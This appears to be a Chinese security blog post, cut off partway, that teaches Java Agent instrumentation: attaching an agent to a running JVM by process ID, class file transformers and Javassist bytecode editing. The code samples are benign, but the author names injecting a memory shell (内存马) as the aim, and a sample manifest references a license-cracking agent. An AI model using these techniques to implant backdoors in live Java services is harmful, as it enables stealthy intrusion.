@@ -1,0 +1,1150 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>JavaSec-Agent | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    JavaSec-Agent
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-18 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="介绍">介绍</h2>
+<p><code>JDK1.5</code>开始，<code>Java</code>新增了<code>Instrumentation(Java Agent API)</code>和<code>JVMTI(JVM Tool Interface)</code>功能，允许<code>JVM</code>在加载某个<code>class文件</code>之前对其字节码进行修改，同时也支持对已加载的<code>class(类字节码)</code>进行重新加载(<code>Retransform</code>)。</p>
+<p>利用<code>Java Agent</code>这一特性衍生出了<code>APM(Application Performance Management，应用性能管理)</code>、<code>RASP(Runtime application self-protection，运行时应用自我保护)</code>、<code>IAST(Interactive Application Security Testing，交互式应用程序安全测试)</code>等相关产品，它们都无一例外的使用了<code>Instrumentation/JVMTI</code>的<code>API</code>来实现动态修改<code>Java类字节码</code>并插入监控或检测代码。</p>
+<p>JavaAgent其实也就是一个 Jar 包，只是启动方式和普通 Jar 包有所不同，对于普通的Jar包，通过指定类的 main 函数进行启动，但是 Java Agent 并不能单独启动，必须依附在一个 Java 应用程序运行。而它的启动方法共有两种，一种的方法是premain,一种是agentmain。</p>
+<ul>
+<li>jvm方式：实现 <strong>premain</strong>方法，在主函数执行前加载。// 当我们提供的 agent 属于基础必备服务时，可以用这种方式</li>
+<li>attach方法：实现 <strong>agentmain</strong>方法，在主函数执行后加载。// 我们的 agent 用来 debug 定位问题，就可以用这种方式</li>
+</ul>
+<p>其中 jvm方式，也就是说要使用这个 agent 的目标应用，在启动的时候，需要指定 jvm 参数-javaagent:xxx.jar。</p>
+<p>而当目标应用程序启动之后，没有添加 -javaagent 加载我们的 agent，但我们希望目标程序使用我们的 agent，这时候就可以使用 attach 方式来使用。</p>
+<p>这两种运行方式的最大区别在于第一种方式只能在程序启动时指定<code>Agent</code>文件，而<code>attach</code>方式可以在<code>Java程序</code>运行后根据<code>进程ID</code>动态注入<code>Agent</code>到<code>JVM</code>。</p>
+<h2 id="特性">特性</h2>
+<p>Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了<code>main</code>方法为程序入口，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的，如下：</p>
+<pre><code class="language-java">public static void premain(String args, Instrumentation inst) {}
+public static void agentmain(String args, Instrumentation inst) {}
+</code></pre>
+<p>Java Agent还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，Java Agent还强制要求了所有的jar文件中必须包含<code>/META-INF/MANIFEST.MF</code>文件，且该文件中必须定义好<code>Premain-Class</code>（Agent模式）或<code>Agent-Class:</code>（Agent模式）配置，如：</p>
+<pre><code class="language-java">Premain-Class: com.anbai.sec.agent.CrackLicenseAgent
+Agent-Class: com.anbai.sec.agent.CrackLicenseAgent
+</code></pre>
+<p>如果我们需要修改已经被JVM加载过的类的字节码，那么还需要设置在<code>MANIFEST.MF</code>中添加<code>Can-Retransform-Classes: true</code>或<code>Can-Redefine-Classes: true</code>。</p>
+<h2 id="简单例子">简单例子</h2>
+<ul>
+<li>IDEA 作为编辑器</li>
+<li>maven 进行包管理</li>
+</ul>
+<p>首先新建project</p>
+<p>新建一个SimpleAgent类</p>
+<pre><code class="language-java">public class SimpleAgent {
+
+    /**
+     * jvm 参数形式启动，运行此方法
+     *
+     * @param agentArgs
+     * @param inst
+     */
+    public static void premain(String agentArgs, Instrumentation inst) {
+        System.out.println(&quot;premain&quot;);
+    }
+
+    /**
+     * 动态 attach 方式启动，运行此方法
+     *
+     * @param agentArgs
+     * @param inst
+     */
+    public static void agentmain(String agentArgs, Instrumentation inst) {
+        System.out.println(&quot;agentmain&quot;);
+    }
+}
+</code></pre>
+<p>通过配置文件<code>MANIFEST.MF</code>打包</p>
+<ul>
+<li>在main/资源目录(Resources)下，新建目录<code>META-INF</code></li>
+<li>在<code>META-INF</code>目录下，新建文件<code>MANIFEST.MF</code></li>
+</ul>
+<p>文件内容如下</p>
+<pre><code class="language-text">Manifest-Version: 1.0
+Premain-Class: com.agent.SimpleAgent
+Agent-Class: com.agent.SimpleAgent
+Can-Redefine-Classes: true
+Can-Retransform-Classes: true
+
+</code></pre>
+<p>请注意，最后的一个空行不能少，在 idea 中，删除最后一行时，会有错误提醒</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/b7fe32d33c7f8dd52bb6f8838585e26e.png" alt="image-20220316132238821" loading="lazy"></figure>
+<p>然后我们的<code>pom.xml</code>配置，需要作出对应的修改</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;Java_agent&lt;/groupId&gt;
+    &lt;artifactId&gt;Java_agent&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+    &lt;build&gt;
+        &lt;plugins&gt;
+            &lt;plugin&gt;
+                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
+                &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;
+                &lt;configuration&gt;
+                    &lt;descriptorRefs&gt;
+                        &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;
+                    &lt;/descriptorRefs&gt;
+                    &lt;archive&gt;
+                        &lt;manifestFile&gt;
+                            src/main/resources/META-INF/MANIFEST.MF
+                        &lt;/manifestFile&gt;
+                        &lt;!--&lt;manifestEntries&gt;--&gt;
+                        &lt;!--&lt;Premain-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Premain-Class&gt;--&gt;
+                        &lt;!--&lt;Agent-Class&gt;com.git.hui.agent.SimpleAgent&lt;/Agent-Class&gt;--&gt;
+                        &lt;!--&lt;Can-Redefine-Classes&gt;true&lt;/Can-Redefine-Classes&gt;--&gt;
+                        &lt;!--&lt;Can-Retransform-Classes&gt;true&lt;/Can-Retransform-Classes&gt;--&gt;
+                        &lt;!--&lt;/manifestEntries&gt;--&gt;
+                    &lt;/archive&gt;
+                &lt;/configuration&gt;
+
+                &lt;executions&gt;
+                    &lt;execution&gt;
+                        &lt;goals&gt;
+                            &lt;goal&gt;attached&lt;/goal&gt;
+                        &lt;/goals&gt;
+                        &lt;phase&gt;package&lt;/phase&gt;
+                    &lt;/execution&gt;
+                &lt;/executions&gt;
+            &lt;/plugin&gt;
+        &lt;/plugins&gt;
+    &lt;/build&gt;
+&lt;/project&gt;
+</code></pre>
+<p>通过<code>mvn assembly:assembly</code>命令打包</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/b18842050d1fe808933de4e4b54f346c.png" alt="image-20220316121015209" loading="lazy"></figure>
+<p>得到结果</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/791e5f4dd3566c5e5324840741d4af0b.png" alt="image-20220316130615521" loading="lazy"></figure>
+<p>再写一个测试类</p>
+<pre><code class="language-java">  public static void main(String[] args) throws InterruptedException {
+        int i =0;
+        while (true){
+            i += 2;
+            System.out.println(&quot;i: &quot; + i);
+            Thread.sleep(1000);
+        }
+    }
+</code></pre>
+<h3 id="jvm">jvm</h3>
+<p>IDEA 测试时，可以直接在配置类，添加 jvm 参数，如下</p>
+<p>agent 绝对地址: <code>-javaagent:*/java-agent-1.0-SNAPSHOT-jar-with-dependencies.jar</code></p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/f49984a6a2e923b61a747870ad091b12.png" alt="image-20220316133305980" loading="lazy"></figure>
+<p>可以看到成功在main函数执行前加载执行了premain函数</p>
+<p>这种方法存在一定的局限性——<strong>只能在启动时使用<code>-javaagent</code>参数指定</strong>。在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载premain。相比之下，agentmain更加实用。</p>
+<h3 id="attach">attach</h3>
+<p>在使用 attach 方式时，可以简单的理解为要将我们的 agent 注入到目标的应用程序中，所以我们需要自己起一个程序来完成这件事情</p>
+<pre><code class="language-java">package com.agent;
+
+import com.sun.tools.attach.AgentInitializationException;
+import com.sun.tools.attach.AgentLoadException;
+import com.sun.tools.attach.AttachNotSupportedException;
+import com.sun.tools.attach.VirtualMachine;
+
+import java.io.IOException;
+
+public class AttachDemo {
+    public static void main(String[] args)
+            throws IOException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, IOException, AgentLoadException, AgentInitializationException {
+        VirtualMachine vm = VirtualMachine.attach(&quot;24840&quot;);
+        vm.loadAgent(&quot;D:\\Java_location\\Java_agent\\target\\Java_agent-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;);
+    }
+}
+</code></pre>
+<p>注意：这里的tools包需要自己导入</p>
+<h4 id="virtualmachine">VirtualMachine</h4>
+<p>VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。下面来看看这几个方法的作用</p>
+<p><strong>Attach</strong> ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p>
+<pre><code class="language-java">VirtualMachine vm = VirtualMachine.attach(v.id());
+</code></pre>
+<p><strong>loadAgent</strong>：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。</p>
+<p><strong>Detach</strong>：从 JVM 上面解除一个代理(agent)</p>
+<p>上面的逻辑比较简单，首先通过<code>jps -l</code>获取目标应用的进程号</p>
+<ul>
+<li>jps 命令类似与 linux 的 ps 命令，但是它只列出系统中所有的 Java 应用程序。 通过 jps 命令可以方便地查看 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息。</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/c4aca573b3ea716069a217867dd158fa.png" alt="image-20220316140133512" loading="lazy"></figure>
+<p>修改进程id后运行AttachDemo后，可以看到循环中执行了一次agentmain函数，表明 agent 被成功注入进去</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/a4959dd51926ac14f49ace042827ae53.png" alt="image-20220316140333245" loading="lazy"></figure>
+<h2 id="进阶">进阶</h2>
+<h3 id="instrumentation">Instrumentation</h3>
+<p><code>Instrumentation</code>是<code>JVMTIAgent</code>（JVM Tool Interface Agent）的一部分。Java agent通过这个类和目标JVM进行交互，从而达到修改数据的效果。</p>
+<p><code>java.lang.instrument.Instrumentation</code>是监测运行在<code>JVM</code>程序的<code>Java API</code>，利用<code>Instrumentation</code>我们可以实现如下功能：</p>
+<ol>
+<li>动态添加或移除自定义的<code>ClassFileTransformer</code>（<code>addTransformer/removeTransformer</code>），JVM会在类加载时调用Agent中注册的<code>ClassFileTransformer</code>；</li>
+<li>动态修改<code>classpath</code>（<code>appendToBootstrapClassLoaderSearch</code>、<code>appendToSystemClassLoaderSearch</code>），将Agent程序添加到<code>BootstrapClassLoader</code>和<code>SystemClassLoaderSearch</code>（对应的是<code>ClassLoader类的getSystemClassLoader方法</code>，默认是<code>sun.misc.Launcher$AppClassLoader</code>）中搜索；</li>
+<li>动态获取所有<code>JVM</code>已加载的类(<code>getAllLoadedClasses</code>)；</li>
+<li>动态获取某个类加载器已实例化的所有类(<code>getInitiatedClasses</code>)。</li>
+<li>重定义某个已加载的类的字节码(<code>redefineClasses</code>)。</li>
+<li>动态设置<code>JNI</code>前缀(<code>setNativeMethodPrefix</code>)，可以实现Hook native方法。</li>
+<li>重新加载某个已经被JVM加载过的类字节码<code>retransformClasses</code>)。</li>
+</ol>
+<p><strong><code>Instrumentation</code>类方法如下：</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/fe498a965b8f23820d82d6d8ac6cc353.png" alt="image-20220316143017979" loading="lazy"></figure>
+<h3 id="classfiletransformer">ClassFileTransformer</h3>
+<p><code>java.lang.instrument.ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。</p>
+<p><strong><code>ClassFileTransformer类代码：</code></strong></p>
+<pre><code class="language-java">package java.lang.instrument;
+
+public interface ClassFileTransformer {
+
+  /**
+     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息
+     *
+     * @param loader              定义要转换的类加载器；如果是引导加载器，则为 null
+     * @param className           类名,如:java/lang/Runtime
+     * @param classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null
+     * @param protectionDomain    要定义或重定义的类的保护域
+     * @param classfileBuffer     类文件格式的输入字节缓冲区（不得修改）
+     * @return 字节码byte数组。
+     */
+    byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,
+                            ProtectionDomain protectionDomain, byte[] classfileBuffer);
+
+}
+</code></pre>
+<p>简单了解一下：</p>
+<ol>
+<li>使用<code>Instrumentation.addTransformer()</code>来加载一个转换器。</li>
+<li>转换器的返回结果（<code>transform()</code>方法的返回值）将成为转换后的字节码。</li>
+<li>对于没有加载的类，会使用<code>ClassLoader.defineClass()</code>定义它；对于已经加载的类，会使用<code>ClassLoader.redefineClasses()</code>重新定义，并配合<code>Instrumentation.retransformClasses</code>进行转换。</li>
+</ol>
+<p>其实就是对每个类（已经加载/没有加载）调用Instrumentation转换器，让其返回转换后的字节码，然后通过javassist修改class字节码</p>
+<p><strong>重写<code>transform</code>方法需要注意以下事项：</strong></p>
+<ol>
+<li><code>ClassLoader</code>如果是被<code>Bootstrap ClassLoader(引导类加载器)</code>所加载那么<code>loader</code>参数的值是空。</li>
+<li>修改类字节码时需要特别注意插入的代码在对应的<code>ClassLoader</code>中可以正确的获取到，否则会报<code>ClassNotFoundException</code>，比如修改<code>java.io.FileInputStream(该类由Bootstrap ClassLoader加载)</code>时插入了我们检测代码，那么我们将必须保证<code>FileInputStream</code>能够获取到我们的检测代码类。</li>
+<li><code>JVM</code>类名的书写方式路径方式：<code>java/lang/String</code>而不是我们常用的类名方式：<code>java.lang.String</code>。</li>
+<li>类字节必须符合<code>JVM</code>校验要求，如果无法验证类字节码会导致<code>JVM</code>崩溃或者<code>VerifyError(类验证错误)</code>。</li>
+<li>如果修改的是<code>retransform</code>类(修改已被<code>JVM</code>加载的类)，修改后的类字节码不得<code>新增方法</code>、<code>修改方法参数</code>、<code>类成员变量</code>。</li>
+<li><code>addTransformer</code>时如果没有传入<code>retransform</code>参数(默认是<code>false</code>)就算<code>MANIFEST.MF</code>中配置了<code>Can-Redefine-Classes: true</code>而且手动调用了<code>retransformClasses</code>方法也一样无法<code>retransform</code>。</li>
+<li>卸载<code>transform</code>时需要使用创建时的<code>Instrumentation</code>实例。</li>
+</ol>
+<h3 id="简单实现">简单实现</h3>
+<p><strong>添加一个新的Transformer类</strong></p>
+<p>新建一个名为TestTransformer的类，内容入下：</p>
+<pre><code class="language-java">package com.agent;
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+
+
+public class TestTransformer implements ClassFileTransformer {
+
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,
+                            ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+
+        System.out.println(className.replace(&quot;/&quot;, &quot;.&quot;));
+        return classfileBuffer;
+    }
+}
+</code></pre>
+<p>重写了TestTransformer方法，返回值不变，打印出类名</p>
+<p>添加之前的simple测试类中agentmain/premain函数内容</p>
+<pre><code>inst.addTransformer(new TestTransformer());
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/207123ccd893657be48d11a803f472ce.png" alt="image-20220316153418751" loading="lazy"></figure>
+<p>可以看到打印出了很多类的类名</p>
+<p>由此可见，java agent还能有更多用法可以拓展，比如性能监控，日志监控、管理会话、安全过滤、请求管理等。</p>
+<h2 id="字节码操作">字节码操作</h2>
+<p>上面已经知道了java agent可以对每个类（已经加载/没有加载）调用Instrumentation转换器，让其返回转换后的字节码</p>
+<p>那么我们只需要通过javassist/ASM修改class字节码就可以达到注入内存马的效果了</p>
+<h3 id="asm">ASM</h3>
+<p>ASM是一种通用Java字节码操作和分析框架，它可以直接以二进制形式修改一个现有的类或动态生成类文件。ASM的版本更新快（<code>ASM 9.0</code>已经支持<code>JDK 16</code>）、<a href="https://asm.ow2.io/performance.html">性能高</a>、功能全，学习成本也相对较高，ASM官方用户手册：<a href="https://asm.ow2.io/asm4-guide.pdf">ASM 4.0 A Java bytecode engineering library</a>。</p>
+<p>ASM相对于javassist更底层，javassist是asm的封装，效率也更高，但比较复杂，后续可能会专门写一篇文章来学习</p>
+<h3 id="javassist">javassist</h3>
+<p><strong>javassist 简介</strong></p>
+<p><code>Javassist</code>是一个开源的分析、编辑和创建Java字节码的类库；相比ASM，<code>Javassist</code>提供了更加简单便捷的API，使用<code>Javassist</code>我们可以像写Java代码一样直接插入Java代码片段，让我们不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用<code>Javassist</code>的API即可实现字节码编辑。学习<code>Javassist</code>可以阅读官方的入门教程：<a href="http://www.javassist.org/tutorial/tutorial.html">Getting Started with Javassist</a>。</p>
+<p>我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassist。</p>
+<p>与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。</p>
+<h4 id="javassist-api和标识符">Javassist API和标识符</h4>
+<p><code>Javassist</code>为我们提供了类似于Java反射机制的API，如：<a href="http://www.javassist.org/html/javassist/CtClass.html">CtClass</a>，<a href="http://www.javassist.org/html/javassist/CtConstructor.html">CtConstructor</a>、<a href="http://www.javassist.org/html/javassist/CtMethod.html">CtMethod</a>、<a href="http://www.javassist.org/html/javassist/CtField.html">CtField</a>与Java反射的<code>Class</code>、<code>Constructor</code>、<code>Method</code>、<code>Field</code>非常的类似。</p>
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ClassPool</td>
+<td>ClassPool是一个存储CtClass的容器，如果调用<code>get</code>方法会搜索并创建一个表示该类的CtClass对象</td>
+</tr>
+<tr>
+<td>CtClass</td>
+<td>CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作</td>
+</tr>
+<tr>
+<td>CtMethod</td>
+<td>可读写的类方法对象</td>
+</tr>
+<tr>
+<td>CtConstructor</td>
+<td>可读写的类构造方法对象</td>
+</tr>
+<tr>
+<td>CtField</td>
+<td>可读写的类成员变量对象</td>
+</tr>
+</tbody>
+</table>
+<p><code>Javassist</code>使用了内置的标识符来表示一些特定的含义，如：<code>$_</code>表示返回值。我们可以在动态插入类代码的时候使用这些特殊的标识符来表示对应的对象。</p>
+<table>
+<thead>
+<tr>
+<th>表达式</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$0, $1, $2, ...</code></td>
+<td><code>this</code>和方法参数</td>
+</tr>
+<tr>
+<td><code>$args</code></td>
+<td><code>Object[]</code>类型的参数数组</td>
+</tr>
+<tr>
+<td><code>$$</code></td>
+<td>所有的参数，如<code>m($$)</code>等价于<code>m($1,$2,...)</code></td>
+</tr>
+<tr>
+<td><code>$cflow(...)</code></td>
+<td>cflow变量</td>
+</tr>
+<tr>
+<td><code>$r</code></td>
+<td>返回类型，用于类型转换</td>
+</tr>
+<tr>
+<td><code>$w</code></td>
+<td>包装类型，用于类型转换</td>
+</tr>
+<tr>
+<td><code>$_</code></td>
+<td>方法返回值</td>
+</tr>
+<tr>
+<td><code>$sig</code></td>
+<td>方法签名，返回<code>java.lang.Class[]</code>数组类型</td>
+</tr>
+<tr>
+<td><code>$type</code></td>
+<td>返回值类型，<code>java.lang.Class</code>类型</td>
+</tr>
+<tr>
+<td><code>$class</code></td>
+<td>当前类，<code>java.lang.Class</code>类型</td>
+</tr>
+</tbody>
+</table>
+<p>想要系统的学习可以看<a href="http://www.javassist.org/tutorial/tutorial.htmll">官方教程</a></p>
+<h4 id="读取类成员变量方法信息">读取类/成员变量/方法信息</h4>
+<p><code>Javassist</code>读取类信息非常简单，使用<code>ClassPool</code>对象获取到<code>CtClass</code>对象后就可以像使用Java反射API一样去读取类信息了。</p>
+<p>首先maven导入</p>
+<pre><code class="language-xml">    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.javassist&lt;/groupId&gt;
+            &lt;artifactId&gt;javassist&lt;/artifactId&gt;
+            &lt;version&gt;3.26.0-GA&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre>
+<p>也可以官网下载jar包，导入module，library</p>
+<pre><code>http://www.javassist.org/
+</code></pre>
+<p><strong>Student学生类实例</strong></p>
+<pre><code class="language-java">package com.agent;
+
+
+import java.io.Serializable;
+
+public class Student implements Serializable {
+    private String name;
+    private int age;
+    public String address;
+
+    public Student() {
+    }
+    private Student(String name){
+        this.name = name;
+    }
+    Student(String name ,int age){
+        this.name = name;
+        this.age = age;
+    }
+    public Student(String name,int age,String address){
+        this.name = name;
+        this.age = age;
+        this.address = address;
+    }
+    private void function(){
+        System.out.println(&quot;function&quot;);
+    }
+    public void method1(){
+        System.out.println(&quot;method&quot;);
+    }
+    public void method2(String s){
+        System.out.println(&quot;method&quot; + s);
+    }
+    public String method3(String s,int i){
+        return s + &quot;,&quot; + i;
+    }
+
+    @Override
+    public String toString() {
+        return &quot;Student{&quot; +
+                &quot;name='&quot; + name + '\'' +
+                &quot;, age=&quot; + age +
+                &quot;, address='&quot; + address + '\'' +
+                '}';
+    }
+}
+</code></pre>
+<p><strong>Javassist读取类信息示例代码：</strong></p>
+<pre><code class="language-java">package com.agent;
+import javassist.*;
+
+import java.util.Arrays;
+public class JavassistDemo1 {
+    public static void main(String[] args) {
+        // 创建ClassPool对象
+        ClassPool classPool = ClassPool.getDefault();
+        try {
+            CtClass ctClass = classPool.get(&quot;com.agent.Student&quot;);
+            System.out.println(
+                    &quot;解析类名：&quot; + ctClass.getName() + &quot;，父类：&quot; + ctClass.getSuperclass().getName() +
+                            &quot;，实现接口：&quot; + Arrays.toString(ctClass.getInterfaces())
+            );
+            System.out.println(&quot;-----------------------------------------------------------------------------&quot;);
+            // 获取所有的构造方法
+            CtConstructor[] ctConstructors = ctClass.getDeclaredConstructors();
+            // 获取所有的成员变量
+            CtField[] ctFields = ctClass.getDeclaredFields();
+            // 获取所有的成员方法
+            CtMethod[] ctMethods = ctClass.getDeclaredMethods();
+            // 输出所有的构造方法
+            for (CtConstructor ctConstructor : ctConstructors) {
+                System.out.println(ctConstructor.getMethodInfo());
+            }
+            System.out.println(&quot;-----------------------------------------------------------------------------&quot;);
+            // 输出所有成员变量
+            for (CtField ctField : ctFields) {
+                System.out.println(ctField);
+            }
+            System.out.println(&quot;-----------------------------------------------------------------------------&quot;);
+            // 输出所有的成员方法
+            for (CtMethod ctMethod : ctMethods) {
+                System.out.println(ctMethod);
+            }
+        } catch (NotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+</code></pre>
+<p>程序执行结果：</p>
+<pre><code class="language-java">解析类名：com.agent.Student，父类：java.lang.Object，实现接口：[javassist.CtClassType@7530d0a[public abstract interface class java.io.Serializable fields= constructors= methods=]]
+-----------------------------------------------------------------------------
+&lt;init&gt; ()V
+&lt;init&gt; (Ljava/lang/String;)V
+&lt;init&gt; (Ljava/lang/String;I)V
+&lt;init&gt; (Ljava/lang/String;ILjava/lang/String;)V
+-----------------------------------------------------------------------------
+com.agent.Student.name:Ljava/lang/String;
+com.agent.Student.age:I
+com.agent.Student.address:Ljava/lang/String;
+-----------------------------------------------------------------------------
+javassist.CtMethod@fc41e2d9[private function ()V]
+javassist.CtMethod@cd0f3471[public method1 ()V]
+javassist.CtMethod@bcf01e28[public method2 (Ljava/lang/String;)V]
+javassist.CtMethod@67996580[public method3 (Ljava/lang/String;I)Ljava/lang/String;]
+javassist.CtMethod@69cb6c6d[public toString ()Ljava/lang/String;]
+</code></pre>
+<h4 id="修改类方法">修改类方法</h4>
+<p><code>Javassist</code>实现类方法修改只需要调用<code>CtMethod</code>类的对应的API就可以了。<code>CtMethod</code>提供了类方法修改的API，如：<code>setModifiers</code>可修改类的访问修饰符，<code>insertBefore</code>和<code>insertAfter</code>能够实现在类方法执行的前后插入任意的Java代码片段，<code>setBody</code>可以修改整个方法的代码等。</p>
+<p><strong>Javassist修改类方法示例代码：</strong></p>
+<pre><code class="language-java">package com.agent;
+
+
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import javassist.Modifier;
+import org.apache.commons.io.FileUtils;
+import java.io.File;
+
+public class JavassistDemo2 {
+
+    public static void main(String[] args) {
+        // 创建ClassPool对象
+        ClassPool classPool = ClassPool.getDefault();
+        try {
+            CtClass ctClass = classPool.get(&quot;com.agent.Student&quot;);
+            // 获取method3方法
+            CtMethod helloMethod = ctClass.getDeclaredMethod(&quot;method3&quot;);
+            // 修改方法的访问权限为private
+            helloMethod.setModifiers(Modifier.PRIVATE);
